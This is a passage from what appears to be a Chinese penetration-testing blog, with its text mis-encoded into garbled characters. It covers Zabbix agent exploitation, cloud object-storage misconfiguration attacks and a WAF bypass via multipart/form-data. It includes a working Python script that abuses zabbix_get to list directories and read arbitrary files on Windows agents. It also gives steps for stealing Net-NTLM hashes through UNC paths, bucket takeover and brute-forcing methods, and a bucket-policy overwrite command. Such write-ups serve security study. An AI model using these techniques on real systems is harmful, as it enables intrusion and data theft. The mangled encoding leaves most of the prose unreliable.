æŸ¥è¯¢å¹¶è¿”å›ç¬¬ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡ WQL è¯­å¥å¯ä»¥æŸ¥è¯¢è®¸å¤šæœºå™¨ä¿¡æ¯ã€‚ å¦‚ï¼šWQL æŸ¥è¯¢ç›˜ç¬¦ zabbix_get -s agent -p 10050 -k \"wmi.get[root\\\\cimv2,\\\"SELECT Name FROM Win32_LogicalDisk\\\"]\" åˆ©ç”¨ wmi.get å‘½ä»¤è¿›è¡Œç›®å½•éå†ã€æ–‡ä»¶éå†ï¼Œç»“åˆ vfs.file.contents å‘½ä»¤å°±èƒ½å¤Ÿåœ¨ Windows ä¸‹å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚ åŸºäº zabbix_get å‘½ä»¤å†™äº†ä¸ª python è„šæœ¬ï¼Œå®ç° Windows çš„åˆ—ç›®å½•ã€è¯»æ–‡ä»¶åŠŸèƒ½ã€‚ import os import sys count = 0 def zabbix_exec(ip, command): global count count = count + 1 check = os.popen(\"./zabbix_get -s \" + ip + \" -k \\\"\" + command + \"\\\"\").read() if \"Cannot obtain WMI information\" not in check: return check.strip() else: return False def getpath(path): return path.replace(\"\\\\\",\"\\\\\\\\\\\\\\\\\").replace(\"$\",\"\\\\$\") def GetDisk(ip): where = \"\" while(True): check_disk = zabbix_exec(ip, \"wmi.get[root\\cimv2,\\\\\\\"SELECT Name FROM Win32_LogicalDisk WHERE Name != '' \" + where + \"\\\\\\\"]\") if check_disk: print(check_disk) where = where + \"AND Name != '\" + check_disk+ \"'\" else: break def GetDirs(ip, dir): drive = dir[0:2] path = dir[2:] where = \"\" while(True): check_dir = zabbix_exec(ip, \"wmi.get[root\\cimv2,\\\\\\\"SELECT Caption FROM Win32_Directory WHERE Drive='\" + drive + \"' AND Path='\" + getpath(path) + \"' \" + where + \"\\\\\\\"]\") if check_dir: print(check_dir) where = where + \"AND Caption != '\" + getpath(check_dir) + \"'\" else: break def GetFiles(ip, dir): drive = dir[0:2] path = dir[2:] where = \"\" while(True): check_file = zabbix_exec(ip, \"wmi.get[root\\cimv2,\\\\\\\"SELECT Name FROM CIM_DataFile WHERE Drive='\" + drive + \"' AND Path='\" + getpath(path) + \"' \" + where + \"\\\\\\\"]\") if check_file: if \"Invalid item key format\" in check_file: continue print(check_file) where = where + \"AND Name != '\" + getpath(check_file) + \"'\" else: break def Readfile(ip, file): read = zabbix_exec(ip, \"vfs.file.contents[\" + file + \"]\") print(read) if __name__ == \"__main__\": if len(sys.argv) == 2: GetDisk(sys.argv[1]) elif sys.argv[2][-1] != \"\\\\\": Readfile(sys.argv[1], sys.argv[2]) else: GetDirs(sys.argv[1],sys.argv[2]) GetFiles(sys.argv[1],sys.argv[2]) print(\"Request count: \" + str(count)) ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:4","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3.5 Windows UNC è·¯å¾„åˆ©ç”¨ åœ¨ Windows Zabbix Agent ç¯å¢ƒä¸­ï¼Œå¯ä»¥åˆ©ç”¨ vfs.file.contents å‘½ä»¤è¯»å– UNC è·¯å¾„ï¼Œçªƒå– Zabbix Agent æœºå™¨çš„ Net-NTLM hashï¼Œä»è€Œè¿›ä¸€æ­¥ Net-NTLM relay æ”»å‡»ã€‚ Window Zabbix Agent é»˜è®¤å®‰è£…æˆ Windows æœåŠ¡ï¼Œè¿è¡Œåœ¨ SYSTEM æƒé™ä¸‹ã€‚åœ¨å·¥ä½œç»„ç¯å¢ƒä¸­ï¼Œsystem ç”¨æˆ·çš„ Net-NTLM hash ä¸ºç©ºï¼Œæ‰€ä»¥å·¥ä½œç»„ç¯å¢ƒæ— æ³•åˆ©ç”¨ã€‚ åœ¨åŸŸå†…ç¯å¢ƒä¸­ï¼ŒSYSTEM ç”¨æˆ·å³æœºå™¨ç”¨æˆ·ï¼Œå¦‚æœæ˜¯ Net-NTLM v1 çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ Responder å·¥å…·è·å– Net-NTLM v1 hash å¹¶é€šè¿‡ç®—æ³•ç¼ºé™·è§£å¯†æ‹¿åˆ° NTLM hashï¼Œé…åˆèµ„æºçº¦æŸå§”æ´¾è·å–åŸŸå†…æœºå™¨ç”¨æˆ·æƒé™ï¼Œä»è€Œæ‹¿ä¸‹ Agent æœºå™¨æƒé™ã€‚ ä¹Ÿå¯ä»¥é…åˆ CVE-2019-1040 æ¼æ´ï¼Œrelay åˆ° ldap ä¸Šé…ç½®åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾è¿›è€Œæ‹¿ä¸‹ Agent æœºå™¨æƒé™ã€‚ï¼ˆæ­¤å¤„ç›´æ¥ç»“æœç›´æ¥å¼•ç”¨ï¼Œæœªåšå®éªŒï¼‰ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:5","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3.6 Zabbix Proxy å’Œä¸»åŠ¨æ£€æŸ¥æ¨¡å¼åˆ©ç”¨åœºæ™¯ é€šè¿‡ zabbix_get å·¥å…·æ‰§è¡Œç›‘æ§é¡¹å‘½ä»¤åªé€‚åˆ Agent è¢«åŠ¨æ¨¡å¼ä¸” 10050 ç«¯å£å¯ä»¥é€šè®¯çš„åœºæ™¯ å¦‚æœåœ¨ Zabbix Proxy åœºæ™¯æˆ– Agent ä¸»åŠ¨æ£€æŸ¥æ¨¡å¼çš„æƒ…å†µä¸‹ï¼ŒZabbix Server æ— æ³•ç›´æ¥ä¸ Agent 10050 ç«¯å£é€šè®¯ï¼Œå¯ä»¥ä½¿ç”¨æ¯”è¾ƒé€šç”¨çš„åŠæ³•ï¼Œå°±æ˜¯é€šè¿‡ Zabbix Web æ·»åŠ ç›‘æ§é¡¹ã€‚ å…¶å®ƒé…ç½®åŒç†ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:6","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"å‚è€ƒ Zabbix æ”»å‡»é¢æŒ–æ˜ä¸åˆ©ç”¨ vulhub Zabbix æ‰‹å†Œ Zabbixç›‘æ§åŸç†åŠæ¶æ„ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:4:0","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹ äº‘ä¸Šå­˜å‚¨å·±ç»æ˜¯ä¼ä¸šä¸­å¸¸è§çš„ä¸€æ¬¾äº‘ä¸Šäº§å“ï¼Œä¼´éšç€äº‘ä¸Šä¸šåŠ¡çš„å‘å±•ï¼Œå¯¹è±¡å­˜å‚¨ä½œä¸ºäº‘åŸç”Ÿä¸€é¡¹é‡è¦çš„èƒ½åŠ›ï¼Œæš´éœ²å‡ºä¸€ç³»åˆ—çš„å®‰å…¨é—®é¢˜ï¼Œå…¶ä¸­çš„æƒé™é…ç½®æ˜¯ç®¡ç†äººå‘˜ä¸å¯å¿½è§†çš„ï¼Œä»æ”»å‡»è€…çš„è§†è§’æ¥çœ‹å‡ å¤§äº‘å­˜å‚¨çš„æ”»å‡»æ–¹æ³•ä¸åˆ©ç”¨ã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 å¯¹è±¡å­˜å‚¨ å¯¹è±¡å­˜å‚¨ä¸­å¯ä»¥æœ‰å¤šä¸ªæ¡¶ï¼ˆBucketï¼‰ï¼Œç„¶åæŠŠå¯¹è±¡ï¼ˆObjectï¼‰æ”¾åœ¨æ¡¶é‡Œï¼Œå¯¹è±¡åˆåŒ…å«äº†ä¸‰ä¸ªéƒ¨åˆ†ï¼šKeyã€Data å’Œ Metadataã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 Bucket å­˜å‚¨ç©ºé—´ï¼ˆBucketï¼‰æ˜¯ç”¨æˆ·ç”¨äºå­˜å‚¨å¯¹è±¡ï¼ˆObjectï¼‰çš„å®¹å™¨ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½å¿…é¡»éš¶å±äºæŸä¸ªå­˜å‚¨ç©ºé—´ã€‚å­˜å‚¨ç©ºé—´å…·æœ‰å„ç§é…ç½®å±æ€§ï¼ŒåŒ…æ‹¬åœ°åŸŸã€è®¿é—®æƒé™ã€å­˜å‚¨ç±»å‹ç­‰ã€‚ç”¨æˆ·å¯ä»¥æ ¹æ®å®é™…éœ€æ±‚ï¼Œåˆ›å»ºä¸åŒç±»å‹çš„å­˜å‚¨ç©ºé—´æ¥å­˜å‚¨ä¸åŒçš„æ•°æ®ã€‚ åŒä¸€ä¸ªå­˜å‚¨ç©ºé—´çš„å†…éƒ¨æ˜¯æ‰å¹³çš„ï¼Œæ²¡æœ‰æ–‡ä»¶ç³»ç»Ÿçš„ç›®å½•ç­‰æ¦‚å¿µï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ç›´æ¥éš¶å±äºå…¶å¯¹åº”çš„å­˜å‚¨ç©ºé—´ã€‚ æ¯ä¸ªç”¨æˆ·å¯ä»¥æ‹¥æœ‰å¤šä¸ªå­˜å‚¨ç©ºé—´ã€‚ å­˜å‚¨ç©ºé—´çš„åç§°åœ¨ OSS èŒƒå›´å†…å¿…é¡»æ˜¯å…¨å±€å”¯ä¸€çš„ï¼Œä¸€æ—¦åˆ›å»ºä¹‹åæ— æ³•ä¿®æ”¹åç§°ã€‚ å­˜å‚¨ç©ºé—´å†…éƒ¨çš„å¯¹è±¡æ•°ç›®æ²¡æœ‰é™åˆ¶ã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:1:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 Object å¯¹è±¡ï¼ˆObjectï¼‰æ˜¯ OSS å­˜å‚¨æ•°æ®çš„åŸºæœ¬å•å…ƒï¼Œä¹Ÿè¢«ç§°ä¸º OSS çš„æ–‡ä»¶ã€‚å’Œä¼ ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿä¸åŒï¼Œå¯¹è±¡æ²¡æœ‰æ–‡ä»¶ç›®å½•å±‚çº§ç»“æ„çš„å…³ç³»ã€‚å¯¹è±¡ç”±å…ƒä¿¡æ¯ï¼ˆObject Metaï¼‰ï¼Œç”¨æˆ·æ•°æ®ï¼ˆDataï¼‰å’Œæ–‡ä»¶åï¼ˆKeyï¼‰ç»„æˆï¼Œå¹¶ä¸”ç”±å­˜å‚¨ç©ºé—´å†…éƒ¨å”¯ä¸€çš„ Key æ¥æ ‡è¯†ã€‚ Key æ˜¯æŒ‡å­˜å‚¨æ¡¶ä¸­çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚ä¸€ä¸ª URL ä¸ºï¼šhttps://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203171716980.pngï¼Œè¿™é‡Œçš„ geekby æ˜¯å­˜å‚¨æ¡¶ Bucket çš„åç§°ï¼Œ/MarkDown/202203171716980.png å°±æ˜¯ Keyã€‚ å¯¹è±¡å…ƒä¿¡æ¯æ˜¯ä¸€ç»„é”®å€¼å¯¹ï¼Œè¡¨ç¤ºäº†å¯¹è±¡çš„ä¸€äº›å±æ€§ï¼Œæ¯”å¦‚æœ€åä¿®æ”¹æ—¶é—´ã€å¤§å°ç­‰ä¿¡æ¯ï¼ŒåŒæ—¶ç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨å…ƒä¿¡æ¯ä¸­å­˜å‚¨ä¸€äº›è‡ªå®šä¹‰çš„ä¿¡æ¯ã€‚å¯ä»¥ç®€å•çš„ç†è§£æˆæ•°æ®çš„æ ‡ç­¾ã€æè¿°ä¹‹ç±»çš„ä¿¡æ¯ï¼Œè¿™ç‚¹ä¸åŒäºä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ï¼Œåœ¨ä¼ ç»Ÿçš„æ–‡ä»¶å­˜å‚¨ä¸­è¿™ç±»ä¿¡æ¯æ˜¯ç›´æ¥å°è£…åœ¨æ–‡ä»¶é‡Œçš„ï¼Œæœ‰äº†å…ƒæ•°æ®çš„å­˜åœ¨ï¼Œå¯ä»¥å¤§å¤§çš„åŠ å¿«å¯¹è±¡çš„æ’åºã€åˆ†ç±»å’ŒæŸ¥æ‰¾ã€‚ Data å°±æ˜¯å­˜å‚¨çš„æ•°æ®æœ¬ä½“ã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:1:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 å¯¹è±¡å­˜å‚¨çš„åˆ©ç”¨æ–¹å¼ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.1 Object éå† åœ¨åˆ›å»º Bucket æ—¶ï¼Œå¯ä»¥é€‰æ‹©æ˜¯å¦å…¬å¼€ï¼Œé»˜è®¤æ˜¯ private çš„æƒé™ï¼Œå¦‚æœåœ¨é”™è¯¯çš„é…ç½®ä¸‹ï¼Œç»™äº† Listobject æƒé™ï¼Œå°±ä¼šå¯¼è‡´å¯éå†å­˜å‚¨æ¡¶ã€‚ 2.1.1 é˜¿é‡Œäº‘ åœ¨æ­¤æ—¶å¦‚æœé€‰æ‹©å…¬æœ‰è¯»çš„è¯ï¼Œä¼šå‡ºç°ä¸¤ç§æƒ…å†µï¼š åœ¨åªé…ç½®è¯»å†™æƒé™è®¾ç½®ä¸ºå…¬æœ‰è¯»æˆ–å…¬å…±è¯»å†™çš„æƒ…å†µä¸‹ï¼Œæ— æ³•åˆ—å‡ºå¯¹è±¡ï¼Œä½†èƒ½å¤Ÿç›´æ¥è¯»å–å¯¹åº”çš„æ–‡ä»¶ï¼ˆæ­£å¸¸æƒ…å†µï¼‰ å¦‚æœæƒ³åˆ—å‡º Object å¯¹è±¡ï¼Œéœ€è¦åœ¨ Bucket æˆæƒç­–ç•¥ä¸­è®¾ç½® ListObject å³å¯ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 Bucket æ¡¶çˆ†ç ´ å½“ä¸çŸ¥é“ Bucket åç§°çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´è·å¾— Bucket åç§°ï¼Œè¿™æœ‰äº›ç±»ä¼¼äºç›®å½•çˆ†ç ´ï¼Œåªä¸è¿‡ç›®å½•çˆ†ç ´ä¸€èˆ¬é€šè¿‡çŠ¶æ€ç åˆ¤æ–­ï¼Œè€Œè¿™ä¸ªé€šè¿‡é¡µé¢çš„å†…å®¹åˆ¤æ–­ã€‚ 2.2.1 é˜¿é‡Œäº‘ AccessDeniedï¼šå­˜åœ¨å­˜å‚¨æ¡¶ï¼Œä½†æ— æƒé™è®¿é—® InvalidBucketNameï¼šè¡¨ç¤ºå­˜å‚¨æ¡¶çš„åç§°ä¸ç¬¦åˆè§„èŒƒï¼Œå±äºæ— æ•ˆçš„å­˜å‚¨æ¡¶åç§° NoSuchBucketï¼šè¡¨ç¤ºä¸å­˜åœ¨è¿™ä¸ªå­˜å‚¨æ¡¶ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 ç‰¹å®šçš„ Bucket ç­–ç•¥é…ç½® ç‰¹å®šçš„ç­–ç•¥é…ç½®çš„æŒ‡çš„æ˜¯ï¼Œå¦‚æœç®¡ç†å‘˜è®¾ç½®äº†æŸäº› IPï¼ŒUA æ‰å¯ä»¥è¯·æ±‚è¯¥å­˜å‚¨æ¡¶çš„è¯ï¼Œæ­¤æ—¶å¦‚æœé”™è¯¯çš„é…ç½®äº† GetBucketPolicyï¼Œå¯å¯¼è‡´æ”»å‡»è€…è·å–ç­–ç•¥é…ç½® 2.3.1 é˜¿é‡Œäº‘ é€šè¿‡ç›´æ¥è®¿é—®ï¼šhttp(s)://url/?policy æ¥ç¡®å®šæ˜¯å¦å¯¹ Bucket å…·æœ‰è¯»å–æƒé™ å¯ä»¥çœ‹åˆ°ï¼Œç®¡ç†å‘˜é…ç½®äº†å¯¹äºä»»æ„è®¤è¯ä¸»ä¸»ä½“å¼€æ”¾äº†æ‰€æœ‰ Action çš„æƒé™ã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:3","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.4 ä»»æ„æ–‡ä»¶ä¸Šä¼ ä¸è¦†ç›– å¦‚æœåœ¨é…ç½®å­˜å‚¨æ¡¶æ—¶ï¼Œç®¡ç†å‘˜é”™è¯¯çš„å°†å­˜å‚¨æ¡¶æƒé™ï¼Œé…ç½®ä¸ºå¯å†™ï¼Œè¿™å°†ä¼šå¯¼è‡´æ”»å‡»è€…å¯ä¸Šä¼ ä»»æ„æ–‡ä»¶åˆ°å­˜å‚¨æ¡¶ä¸­ï¼Œæˆ–è¦†ç›–å·²ç»å­˜åœ¨çš„æ–‡ä»¶ 2.4.1 é˜¿é‡Œäº‘ å¦‚æœç›®æ ‡çš„å¯¹è±¡å­˜å‚¨æ”¯æŒ html è§£æï¼Œé‚£å°±å¯ä»¥åˆ©ç”¨ä»»æ„æ–‡ä»¶ä¸Šä¼ è¿›è¡Œ XSS é’“é±¼ã€æŒ‚æš—é“¾ã€æŒ‚é»‘é¡µã€ä¾›åº”é“¾æŠ•æ¯’ç­‰æ“ä½œã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:4","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.6 Bucket æ¥ç®¡ å‡è®¾ç®¡ç†å‘˜é€šè¿‡åŸŸåè§£æå¹¶ç»‘å®šäº†ä¸€ä¸ªå­˜å‚¨æ¡¶ï¼Œä½†æ˜¯ç®¡ç†å‘˜å°†å­˜å‚¨æ¡¶åˆ é™¤åï¼Œæ²¡æœ‰å°†åŸŸåè§£æçš„ CNAME åˆ é™¤ï¼Œè¿™æ—¶ä¼šè®¿é—®åŸŸåå°±ä¼šå‡ºç° NoSuchBucketã€‚å› æ­¤å¯ä»¥ç™»å½•è‡ªå·±çš„é˜¿é‡Œäº‘è´¦å·ï¼Œåˆ›å»ºåŒæ ·çš„ Bucket å³å¯ã€‚ 2.6.1 é˜¿é‡Œäº‘ åœ¨é˜¿é‡Œäº‘ä¸‹ï¼Œå½“ Bucket æ˜¾ç¤º NoSuchBucket è¯´æ˜æ˜¯å¯ä»¥æ¥ç®¡çš„ï¼Œå¦‚æœæ˜¾ç¤º AccessDenied åˆ™ä¸è¡Œã€‚ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:5","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.7 Bucket å¯ä¿®æ”¹ å¦‚æœæ‹¥æœ‰ Bucket Policy çš„ç¼–è¾‘æƒé™ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ æˆ–ä¿®æ”¹ä¸€ä¸ªæ–°çš„é…ç½®ï¼Œè¿›è€Œå®ç°æ”»å‡»ï¼ˆæ‹’ç»æœåŠ¡æˆ–è€…ä¿®æ”¹è®¿é—®ç­–ç•¥ï¼‰ 2.7.1 é˜¿é‡Œäº‘ å¯ä»¥é€šè¿‡ç›´æ¥ PUT ä¸€ä¸ªé…ç½®ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ aliyun oss bucket-policy oss://securitytest-geekby --method put ./oss.json å‚è€ƒ ç«çº¿æ²™é¾™â€”â€”æµ…æäº‘å­˜å‚¨çš„æ”»å‡»åˆ©ç”¨æ–¹å¼ ","date":"2022-03-17","objectID":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/:2:6","tags":["æ¸—é€æµ‹è¯•"],"title":"å¯¹è±¡å­˜å‚¨æ”»é˜²æ¡ˆä¾‹","uri":"/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"WAF Bypass","date":"2022-03-04","objectID":"/2022/03/waf-bypass/","tags":["æ¸—é€æµ‹è¯•"],"title":"WAF Bypass","uri":"/2022/03/waf-bypass/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"WAF Bypass æœ¬æ–‡ä»‹ç»çš„æ€è·¯ä¸»è¦å›´ç»•é’ˆå¯¹äº POST å‚æ•°çš„ multipart/form-data è¿›è¡Œè®¨è®ºã€‚ multipart/form-data æ˜¯ä¸ºäº†è§£å†³ä¸Šä¼ æ–‡ä»¶åœºæ™¯ä¸‹æ–‡ä»¶å†…å®¹è¾ƒå¤§ä¸”å†…ç½®å­—ç¬¦ä¸å¯æ§çš„é—®é¢˜ã€‚åœ¨æœ€åˆçš„ http åè®®ä¸­ï¼Œå¹¶æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶æ–¹é¢çš„åŠŸèƒ½ã€‚RFC1867 ä¸º HTTP åè®®æ·»åŠ äº†è¿™ä¸ªèƒ½åŠ›ã€‚å¸¸è§çš„æµè§ˆå™¨éƒ½å·²ç»æ”¯æŒã€‚æŒ‰ç…§æ­¤è§„èŒƒå°†ç”¨æˆ·æŒ‡å®šçš„æ–‡ä»¶å‘é€åˆ°æœåŠ¡å™¨ï¼Œå¯ä»¥æŒ‰ç…§æ­¤è§„èŒƒè§£æå‡ºç”¨æˆ·å‘é€æ¥çš„æ–‡ä»¶ã€‚ HTTP ä¼ è¾“çš„å†…å®¹é€šè¿‡ boundary è¿›è¡Œäº†åˆ†å‰²ï¼Œä»¥ --boundary å¼€å§‹ï¼Œå¹¶ä»¥ --boundary-- ç»“å°¾ã€‚ multipart/form-data æ ¼å¼ä¹Ÿæ˜¯å¯ä»¥ä¼ é€’ POST å‚æ•°çš„ã€‚å¯¹äº Nginx + PHP çš„æ¶æ„ï¼ŒNginx å®é™…ä¸Šæ˜¯ä¸è´Ÿè´£è§£æ multipart/form-data çš„ body éƒ¨åˆ†çš„ï¼Œè€Œæ˜¯äº¤ç”± PHP æ¥è§£æï¼Œå› æ­¤ WAF æ‰€è·å–çš„å†…å®¹å°±å¾ˆæœ‰å¯èƒ½ä¸åç«¯çš„ PHP å‘ç”Ÿä¸ä¸€è‡´ã€‚ é€šè¿‡ä¸€ä¸ªç®€å•çš„è„šæœ¬æ¥éªŒè¯ä¸Šé¢çš„è¯´æ³•ã€‚ \u003c?php echo file_get_contents(\"php://input\"); echo '$_POST Content\\n'; echo ''; var_dump($_POST); echo '$_FILES Content\\n'; echo ''; var_dump($_FILES); ?\u003e æ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨ multipart/form-data POST ä¼ è¾“ä¸€ä¸ªå‚æ•° fï¼Œå…¶å€¼ä¸º 1ï¼š ä¸Šé¢è¯´åˆ°ï¼Œmultipart/form-data ç”¨æ¥è§£å†³ä¼ è¾“æ–‡ä»¶çš„é—®é¢˜ï¼Œé‚£ä»€ä¹ˆæƒ…å†µæ˜¯ä¸Šä¼ æ–‡ä»¶ï¼Ÿä»€ä¹ˆæƒ…å†µæ˜¯ POST å‚æ•°å‘¢ï¼Ÿå…³é”®ç‚¹åœ¨äºæœ‰æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„ filename=ï¼Œè¿™ 9 ä¸ªå­—ç¬¦ç¼ºä¸€ä¸å¯ã€‚åŠ ä¸Šäº† filename= ä»¥åçš„å›æ˜¾ï¼š 